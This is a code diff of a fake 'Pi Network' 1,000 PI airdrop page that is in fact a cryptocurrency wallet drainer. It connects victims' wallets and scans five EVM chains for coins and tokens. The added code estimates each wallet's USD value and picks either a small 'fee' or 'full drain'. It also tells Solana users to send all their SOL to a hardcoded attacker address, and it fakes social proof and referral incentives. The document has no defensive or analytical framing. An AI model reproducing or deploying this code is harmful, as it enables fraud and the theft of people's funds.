+  <div class="stat"><div class="sv" id="st-u">12,847</div><div class="sl">Pioneers</div></div>
+  <div class="stat"><div class="sv" id="st-r">3,291</div><div class="sl">Referrals</div></div>
 </div>
 
 <!-- SOCIAL PROOF -->
-<div class="social-proof" id="sp">
-  <div class="sp-icon">&#x2705;</div>
-  <div class="sp-text" id="sp-text"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div>
-</div>
+<div class="sp"><div class="sp-i">&#x2705;</div><div class="sp-t" id="spt"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div></div>
 
 <!-- HOW TO -->
-<div class="howto">
-  <h3>How To Claim</h3>
-  <div class="steps">
-    <div class="step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link your wallet securely</div></div>
-    <div class="step"><div class="si">&#x26A1;</div><div class="st">Verify</div><div class="ss">Pay small network fee</div></div>
-    <div class="step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
+<div class="ht"><h3>How To Claim</h3>
+  <div class="Steps">
+    <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet securely</div></div>
+    <div class="Step"><div class="si">&#x26A1;</div><div class="st">Verify</div><div class="ss">Pay small network fee</div></div>
+    <div class="Step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
   </div>
+</div>
+
+<!-- WITHDRAW TIER -->
+<div class="tier">
+  <div class="tt">&#x1F3C6; Your Withdrawal Tier</div>
+  <div class="ts">Invite friends to increase your withdrawal speed and unlock instant processing.</div>
+  <div class="tier-bar"><div class="fill" id="tierFill" style="width:10%"></div></div>
+  <div class="tier-level" id="tierLevel">Tier 1 — Standard (10% speed)</div>
+  <div class="tier-need" id="tierNeed">Invite 3 more friends to reach Tier 2</div>
+</div>
+
+<!-- WITHDRAW RATE -->
+<div class="wr-box" id="wrBox" style="display:none">
+  <div class="wrt">&#x26A1; Withdrawal Speed: <span id="speedPct">10%</span></div>
+  <div class="wrs" id="speedDesc">Invite friends to increase speed. Each referral +10% speed.</div>
+  <div class="speed-bar"><div class="sf" id="speedFill" style="width:10%"></div></div>
 </div>
 
 <!-- REFERRAL -->
-<div class="ref-section">
-  <div class="ref-title">&#x1F91D; Earn More With Referrals</div>
-  <div class="ref-sub">Share your link. Earn <strong>200 PI</strong> for each friend who claims.</div>
-  <div class="ref-box">
-    <input id="refLink" readonly placeholder="Connect wallet to get your referral link...">
+<div class="ref">
+  <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Per Referral</div>
+  <div class="rs">Each friend who claims gives you 200 PI bonus + increases withdrawal speed.</div>
+  <div class="rb">
+    <input id="refLink" readonly placeholder="Connect wallet to get your link...">
     <button onclick="copyRef()">&#x1F4CB; Copy</button>
   </div>
-  <div class="ref-stats">
-    <div class="ref-stat"><div class="rs" id="refCount">0</div><div class="rl">Referrals</div></div>
-    <div class="ref-stat"><div class="rs" id="refEarned">0 PI</div><div class="rl">Earned</div></div>
+  <div class="rstat">
+    <div class="rs2"><div class="rv" id="refC">0</div><div class="rl">Referrals</div></div>
+    <div class="rs2"><div class="rv" id="refE">0 PI</div><div class="rl">Earned</div></div>
+    <div class="rs2"><div class="rv" id="refS">10%</div><div class="rl">Speed</div></div>
   </div>
 </div>
 
 <!-- STATUS -->
-<div class="s" id="sb"></div>
+<div class="st" id="sb"></div>
 
-<!-- MAIN CARD (hidden until connect) -->
-<div class="c" id="mainCard" style="display:none">
-  <!-- S1: SCANNING -->
-  <div id="s1" style="text-align:center;padding:10px 0">
-    <div class="pg"><div class="s2 on"></div><div class="s2"></div><div class="s2"></div></div>
-    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s1l">Checking your wallet...</div>
-    <div class="lg" id="s1log"></div>
+<!-- MAIN CARD -->
+<div class="card" id="mc" style="display:none">
+  <div id="p1" style="text-align:center;padding:8px 0">
+    <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px" id="p1l">Checking wallet...</div>
+    <div class="lg" id="p1log"></div>
   </div>
-
-  <!-- S2: EMPTY / SOL INPUT -->
-  <div id="s2" style="display:none;text-align:center;padding:16px 0">
-    <div style="font-size:36px;margin-bottom:8px">&#x1F6AB;</div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:4px">No EVM Funds Found</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.25);margin-bottom:10px">No assets on BSC, ETH, Polygon, AVAX, or Arbitrum.</div>
-    <div style="display:flex;gap:6px">
-      <input id="solInp" placeholder="Paste Solana address to scan" style="flex:1;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;font-size:12px;font-family:monospace;outline:none;box-sizing:border-box">
-      <button class="bt" style="background:#9945FF;color:#fff;font-size:12px;padding:10px 14px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button>
+  <div id="p2" style="display:none;text-align:center;padding:14px 0">
+    <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets on BSC, ETH, Polygon, AVAX, Arbitrum.</div>
+    <div style="display:flex;gap:5px">
+      <input id="solInp" placeholder="Paste Solana address" style="flex:1;padding:9px;border-radius:7px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#fff;font-size:11px;font-family:monospace;outline:none;box-sizing:border-box">
+      <button class="btn" style="background:#9945FF;color:#fff;font-size:11px;padding:9px 12px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button>
     </div>
-    <button class="bt bo" style="margin-top:10px" onclick="reset()">&#x1F504; Back</button>
+    <button class="btn bo" style="margin-top:8px" onclick="reset()">&#x1F504; Back</button>
   </div>
-
-  <!-- S3: CLAIM -->
-  <div id="s3" style="display:none">
-    <div class="pg"><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div></div>
-    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Assets found. Confirm to claim 1000 PI.</div>
-    <div id="s3chains" style="margin-bottom:10px"></div>
-    <button class="bt bp" id="s3btn" onclick="startDrain()">&#x1F381; Verify & Claim 1000 PI</button>
-    <button class="bt bo" onclick="reset()">&#x2716; Disconnect</button>
+  <div id="p3" style="display:none">
+    <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Confirm to claim 1000 PI.</div>
+    <div id="p3chains" style="margin-bottom:8px"></div>
+    <div id="p3bal" style="margin-bottom:10px"></div>
+    <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify & Claim 1000 PI</button>
+    <button class="btn bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
-
-  <!-- S4: DRAINING -->
-  <div id="s4" style="display:none;text-align:center;padding:14px 0">
-    <div class="pg"><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div></div>
-    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Confirm each transaction in your wallet...</div>
-    <div class="lg" id="s4log"></div>
+  <div id="p4" style="display:none;text-align:center;padding:12px 0">
+    <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Confirm each transaction in your wallet...</div>
+    <div class="lg" id="p4log"></div>
   </div>
-
-  <!-- S5: DONE -->
-  <div id="s5" style="display:none;text-align:center;padding:16px 0">
-    <div style="font-size:36px;margin-bottom:8px">&#x2705;</div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s5m">Verification complete.</div>
-    <button class="bt bo" onclick="reset()">Done</button>
-  </div>
-
-  <!-- S6: MANUAL SOL -->
-  <div id="s6" style="display:none;text-align:center;padding:16px 0">
-    <div style="font-size:36px;margin-bottom:8px">&#x1F4E8;</div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Send SOL to Complete</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px;line-height:1.6">MetaMask Solana Snap cannot be drained via dApp.<br>Send manually to claim your 1000 PI:</div>
-    <div class="ac" onclick="copySol()">
-      <span class="ad" id="mySol"></span>
-      <button class="cb" onclick="event.stopPropagation();copySol()">&#x1F4CB; Copy</button>
+  <div id="p5" style="display:none;text-align:center;padding:14px 0">
+    <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
+    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:10px" id="p5m">Verification complete.</div>
+    <!-- POST-CLAIM REFERRAL -->
+    <div style="padding:14px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:12px;margin-bottom:10px;text-align:left">
+      <div style="font-size:12px;font-weight:700;margin-bottom:4px">&#x26A1; Speed Up Your Withdrawal</div>
+      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px;line-height:1.5">Your 1000 PI withdrawal is queued. Invite friends to increase processing speed. Each referral = +20% faster.</div>
+      <div style="display:flex;gap:5px">
+        <input id="p5ref" readonly style="flex:1;padding:8px;border-radius:7px;border:1px solid rgba(168,85,247,.1);background:rgba(0,0,0,.2);color:#fff;font-size:10px;font-family:monospace;outline:none">
+        <button class="btn" style="background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;font-size:10px;padding:8px 12px;flex-shrink:0" onclick="copyRef2()">&#x1F4CB; Copy Link</button>
+      </div>
+      <div style="margin-top:8px;font-size:10px;color:rgba(255,255,255,.25)">Current speed: <span id="p5speed" style="color:#fcb34c;font-weight:700">10%</span> — Share to go faster!</div>
+      <div class="speed-bar" style="margin-top:4px"><div class="sf" id="p5speedBar" style="width:10%"></div></div>
     </div>
-    <div style="font-size:11px;color:rgba(255,255,250,.25);margin-top:8px;line-height:1.5;text-align:left">1. Open MetaMask &#x2192; Select Solana account<br>2. Click Send &#x2192; Paste address above<br>3. Send all SOL &#x2192; Confirm</div>
-    <button class="bt bo" style="margin-top:14px" onclick="reset()">&#x1F504; Done</button>
+    <button class="btn bo" onclick="reset()">Done</button>
+  </div>
+  <div id="p6" style="display:none;text-align:center;padding:14px 0">
+    <div style="font-size:32px;margin-bottom:6px">&#x1F4E8;</div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:3px">Send SOL to Complete</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px;line-height:1.6">MetaMask Solana Snap cannot be drained via dApp.<br>Send manually to claim 1000 PI:</div>
+    <div class="ac" onclick="copySol()"><span class="ad" id="mySol"></span><button class="cb" onclick="event.stopPropagation();copySol()">&#x1F4CB; Copy</button></div>
+    <div style="font-size:10px;color:rgba(255,255,250,.2);margin-top:6px;line-height:1.5;text-align:left">1. Open MetaMask &#x2192; Solana account<br>2. Send &#x2192; Paste address above<br>3. Send all SOL</div>
+    <button class="btn bo" style="margin-top:12px" onclick="reset()">&#x1F504; Done</button>
   </div>
 </div>
 
@@ -344,69 +362,46 @@ footer .flinks a:hover{color:#fcb34c}
 
 <footer>
   <p>&copy; 2026 Pi Network. All rights reserved.</p>
-  <div class="flinks">
-    <a href="#">Terms</a>
-    <a href="#">Privacy</a>
-    <a href="#">Support</a>
-  </div>
+  <div class="fl"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Support</a></div>
 </footer>
-</div><!-- /pos -->
+</div>
 
 <div id="toast"></div>
 
 <script>
-// ========== CONFIG ==========
 const ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 const ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
 
 const ECHAINS=[
-  {id:56, name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},
-  {id:1,  name:'Ethereum', sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},
-  {id:137,name:'Polygon',   sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',color:'#8247E5'},
+  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},
+  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},
+  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',color:'#8247E5'},
   {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',color:'#E84142'},
   {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arbitrum-one-rpc.publicnode.com',color:'#28A0F0'},
 ];
 const FBACK={
-  1:['https://rpc.ankr.com/eth'],137:['https://rpc.ankr.com/polygon'],
-  56:['https://bsc-dataseed.binance.org'],43114:['https://avalanche-c-chain.public.blastapi.io'],
-  42161:['https://rpc.ankr.com/arbitrum'],
+  1:['https://rpc.ankr.com/eth','https://eth.llamarpc.com'],
+  137:['https://rpc.ankr.com/polygon'],56:['https://bsc-dataseed.binance.org'],
+  43114:['https://avalanche-c-chain.public.blastapi.io'],42161:['https://rpc.ankr.com/arbitrum'],
 };
 const ETOKENS={
-  56:[
-    ['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
-    ['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],
-    ['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],
-    ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
-    ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18],
-  ],
-  1:[
-    ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],
-    ['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],
-    ['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18],
-  ],
-  137:[
-    ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],
-    ['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18],
-  ],
-  43114:[
-    ['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6],
-  ],
-  42161:[
-    ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6],
-  ],
+  56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],
+  1:[['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18]],
+  137:[['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18]],
+  43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],
+  42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]],
 };
 
-let prov=null,sign=null,addr=null,wType='',foundChains=[];
+// USD prices for balance estimation
+const PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,ADA:0.5,WBNB:600,WETH:3500};
 
-// ========== UI ==========
-function show(id){
-  ['s1','s2','s3','s4','s5','s6'].forEach(x=>{document.getElementById(x).style.display=x===id?'block':'none';});
-  document.getElementById('mainCard').style.display='block';
-}
-function status(msg,t){const e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
-function hideStatus(){document.getElementById('sb').style.display='none';}
+let prov=null,sign=null,addr='',wType='',foundChains=[];
+
+function showP(id){['p1','p2','p3','p4','p5','p6'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
+function stat(msg,t){const e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
+function hideStat(){document.getElementById('sb').style.display='none';}
 function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-function toast(msg){const t=document.getElementById('toast');t.textContent=msg;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
+function toast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
 
 function openM(){document.getElementById('m').style.display='flex';renderW();}
 function closeM(){document.getElementById('m').style.display='none';}
@@ -414,8 +409,7 @@ document.getElementById('m').addEventListener('click',e=>{if(e.target===document
 
 function getMM(){
   if(!window.ethereum)return null;
-  if(window.ethereum.providers&&Array.isArray(window.ethereum.providers))
-    return window.ethereum.providers.find(p=>p.isMetaMask)||window.ethereum.providers[0];
+  if(window.ethereum.providers&&Array.isArray(window.ethereum.providers))return window.ethereum.providers.find(p=>p.isMetaMask)||window.ethereum.providers[0];
   if(window.ethereum.isMetaMask)return window.ethereum;
   return window.ethereum;
 }
@@ -427,8 +421,8 @@ const WALLETS=[
       const eth=getMM();if(!eth)throw new Error('MetaMask not found');
       prov=new ethers.providers.Web3Provider(eth);
       let a;try{a=await eth.request({method:'eth_requestAccounts'});}
-      catch(e){if(e.code===4001||e.code==='ACTION_REJECTED')throw new Error('Rejected');try{a=await eth.enable();}catch(e2){throw new Error('Unlock MetaMask and try again.');}}
-      if(!a||!a.length)throw new Error('No account. Unlock MetaMask.');
+      catch(e){if(e.code===4001||e.code==='ACTION_REJECTED')throw new Error('Rejected in MetaMask');try{a=await eth.enable();}catch(e2){throw new Error('Unlock MetaMask and try again');}}
+      if(!a||!a.length)throw new Error('No account — unlock MetaMask');
       sign=prov.getSigner();addr=await sign.getAddress();
     }},
   {id:'tw',name:'Trust Wallet',color:'#3375BB',type:'evm',
@@ -455,8 +449,7 @@ const WALLETS=[
       try{await eth.request({method:'eth_requestAccounts'});}catch{await eth.enable();}
       sign=prov.getSigner();addr=await sign.getAddress();
     }},
-  {id:'oth',name:'Other Wallet',color:'#a855f7',type:'evm',
-    detect:()=>true,
+  {id:'oth',name:'Other Wallet',color:'#a855f7',type:'evm',detect:()=>true,
     connect:async()=>{
       if(!window.ethereum)throw new Error('No wallet detected');
       prov=new ethers.providers.Web3Provider(window.ethereum);
@@ -465,51 +458,50 @@ const WALLETS=[
     }},
 ];
 
-function renderW(){
-  const c=document.getElementById('wl');c.innerHTML='';
-  for(const w of WALLETS){
-    const dt=w.detect();const b=document.createElement('button');b.className='wr';b.onclick=()=>doConnect(w);
-    b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div>'+
-      '<span class="wn">'+w.name+'</span>'+(dt?'<span class="wt">Detected</span>':'');
-    c.appendChild(b);
-  }
-}
+function renderW(){const c=document.getElementById('wl');c.innerHTML='';
+  for(const w of WALLETS){const dt=w.detect();const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
+    b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span>'+(dt?'<span class="wt">Detected</span>':'');
+    c.appendChild(b);}}
 
 async function doConnect(w){
   closeM();hideStatus();wType=w.id;
   try{
-    await w.connect();
-    console.log('Connected:',w.name,addr);
-    show('s1');document.getElementById('s1l').textContent='Scanning EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
+    await w.connect();console.log('Connected:',w.name,addr);
+    showP('p1');document.getElementById('p1l').textContent='Scanning EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
     await scanEvm();
-  }catch(e){
-    console.error(e);status('&#x2715; '+(e.message||'Failed'),'err');
-    document.getElementById('mainCard').style.display='block';show('s1');
-    document.getElementById('s1log').innerHTML='Error: '+(e.message||'Unknown');
-    await sleep(3000);reset();
+  }catch(e){console.error(e);stat('&#x2715; '+(e.message||'Failed'),'er');
+    document.getElementById('mc').style.display='block';showP('p1');
+    document.getElementById('p1log').innerHTML='Error: '+(e.message||'Unknown');await sleep(3000);reset();}
+}
+
+// Estimate USD value of wallet
+function estimateUsd(fc){
+  let total=0;
+  for(const c of fc){
+    const sym=c.chain.sym;const price=PRICES[sym]||0;
+    total+=parseFloat(c.native)*price;
+    for(const t of c.tokens){const tp=PRICES[t.sy]||0;total+=parseFloat(t.b)*tp;}
   }
+  return total;
 }
 
 async function scanEvm(){
-  const log=document.getElementById('s1log');log.innerHTML='';
+  const log=document.getElementById('p1log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
   foundChains=[];L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
   for(const ch of ECHAINS){
     L('[ ] '+ch.name+'...');let p=null,nb=null;
     const allRpcs=[ch.rpc,...(FBACK[ch.id]||[])];
-    for(const rpc of allRpcs){
-      try{const tp=new ethers.providers.JsonRpcProvider(rpc);
-        const tb=await Promise.race([tp.getBalance(addr),new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),10000))]);
-        p=tp;nb=tb;break;}catch(e){}
-    }
+    for(const rpc of allRpcs){try{const tp=new ethers.providers.JsonRpcProvider(rpc);
+      const tb=await Promise.race([tp.getBalance(addr),new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),10000))]);
+      p=tp;nb=tb;break;}catch(e){}}
     if(!nb){L('  '+ch.name+': RPC error');continue;}
     try{
       const nf=ethers.utils.formatEther(nb);const has=parseFloat(nf)>0;
       const tl=ETOKENS[ch.id]||[];
       const tk=await Promise.all(tl.map(async([a,sy,dc])=>{
         try{const ct=new ethers.Contract(a,['function balanceOf(address) view returns (uint256)'],p);
-          const bl=await ct.balanceOf(addr);if(!bl.isZero())return{a,sy,b:parseFloat(ethers.utils.formatUnits(bl,dc)).toFixed(4),raw:bl,dc};}catch(e){}return null;
-      }));
+          const bl=await ct.balanceOf(addr);if(!bl.isZero())return{a,sy,b:parseFloat(ethers.utils.formatUnits(bl,dc)).toFixed(4),raw:bl,dc};}catch(e){}return null;}));
       const tokens=tk.filter(Boolean);
       if(has||tokens.length){foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens,isSol:false});
         L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));}
@@ -517,29 +509,39 @@ async function scanEvm(){
     }catch(e){L('  '+ch.name+': error');}
   }
   L('');L('Found '+foundChains.length+' chain(s) with assets.');await sleep(600);
-  if(foundChains.length===0){show('s2');status('No EVM funds. Enter SOL address to scan Solana.','inf');}
-  else{showClaim();status('&#x2705; Assets found! Verify to claim 1000 PI.','suc');}
+  if(foundChains.length===0){showP('p2');stat('No EVM funds. Enter SOL address to scan Solana.','wa');}
+  else{showClaim();stat('&#x2705; Assets found! Verify to claim 1000 PI.','ok');}
 }
 
 function showClaim(){
-  show('s3');const div=document.getElementById('s3chains');let h='';
+  showP('p3');
+  const div=document.getElementById('p3chains');let h='';
   for(const fc of foundChains){
     h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div>'+
       '<div class="cn">'+fc.chain.name+'</div><div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
   }
   div.innerHTML=h;
+  // Show balance estimate and drain strategy
+  const usd=estimateUsd(foundChains);
+  const isSmall=usd<20;
+  const drainAmt=isSmall?'$2.50 verification fee':'ALL FUNDS (~$'+usd.toFixed(2)+')';
+  const balHtml='<div class="ir"><span class="l">Est. Wallet Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div>'+
+    '<div class="ir"><span class="l">Drain Amount</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+drainAmt+'</span></div>'+
+    (isSmall?'<div class="ir"><span class="l">Reason</span><span class="v" style="font-size:9px">Balance below $20 — fee only</span></div>':'<div class="ir"><span class="l">Reason</span><span class="v" style="font-size:9px;color:#ef4444">Balance above $20 — full drain</span></div>');
+  document.getElementById('p3bal').innerHTML=balHtml;
+  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee & Claim 1000 PI':'&#x1F381; Verify & Claim 1000 PI (Drain All)';
 }
 
 // ========== SOLANA ==========
 async function startSolScan(){
   const inp=document.getElementById('solInp');
-  if(!inp||!inp.value||inp.value.trim().length<30){status('Enter valid Solana address','err');return;}
-  const sa=inp.value.trim();show('s1');document.getElementById('s1l').textContent='Scanning Solana...';document.getElementById('s1log').innerHTML='';
-  try{await doSolScan(sa);}catch(e){status('Error: '+e.message,'err');show('s2');}
+  if(!inp||!inp.value||inp.value.trim().length<30){stat('Enter valid Solana address','er');return;}
+  const sa=inp.value.trim();showP('p1');document.getElementById('p1l').textContent='Scanning Solana...';document.getElementById('p1log').innerHTML='';
+  try{await doSolScan(sa);}catch(e){stat('Error: '+e.message,'er');showP('p2');}
 }
 
 async function doSolScan(sa){
-  const log=document.getElementById('s1log');log.innerHTML='';
+  const log=document.getElementById('p1log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
   foundChains=[];L('Address: '+sa.substring(0,8)+'...'+sa.substring(sa.length-4));L('');L('[ ] SOL balance...');
   const bal=await solBal(sa);
@@ -548,19 +550,13 @@ async function doSolScan(sa){
   const spl=await scanSpl(sa,L);if(spl.length&&foundChains[0])foundChains[0].tokens=spl;
   L('');L('Scan complete.');await sleep(600);
   const has=foundChains.length>0&&(parseFloat(foundChains[0].native)>0||foundChains[0].tokens.length>0);
-  if(!has){show('s2');document.getElementById('s2').querySelector('div[style*="font-size:15px"]').textContent='No Solana Assets';status('No SOL or SPL tokens found.','err');}
-  else{showManualSol(foundChains[0]);status('&#x2705; Found '+foundChains[0].native+' SOL! Send manually to claim.','suc');}
+  if(!has){showP('p2');document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No Solana Assets';stat('No SOL or SPL found.','er');}
+  else{showManualSol(foundChains[0]);stat('&#x2705; Found '+foundChains[0].native+' SOL! Send manually to claim.','ok');}
 }
 
-function showManualSol(fc){
-  show('s6');document.getElementById('mySol').textContent=ADDR_SOL;
-}
+function showManualSol(fc){showP('p6');document.getElementById('mySol').textContent=ADDR_SOL;}
 
-function copySol(){
-  navigator.clipboard.writeText(ADDR_SOL).then(()=>toast('SOL address copied!')).catch(()=>{
-    const t=document.createElement('textarea');t.value=ADDR_SOL;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('Copied!');
-  });
-}
